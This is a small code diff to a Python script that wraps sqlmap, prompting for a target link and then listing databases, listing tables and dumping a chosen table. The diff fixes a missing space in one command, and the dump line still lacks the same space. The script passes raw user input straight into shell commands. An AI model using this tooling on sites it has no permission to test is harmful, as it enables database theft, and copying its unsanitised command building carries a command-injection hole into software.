@@ -25,7 +25,7 @@ print("""
 a = input("the link : ")
 sqll = os.system('sqlmap -u '+a+ " --dbs --batch")
 d = input("database name : ")
-dat = os.system('sqlmap -u '+a+ "-D "+d+ " --tables --batch")
+dat = os.system('sqlmap -u '+a+ " -D "+d+" --tables --batch")
 tt = input("the table : ")
 table = os.system('sqlmap -u '+a+ "-D "+d+ " -T "+tt+ " --dump --batch")																								
 											
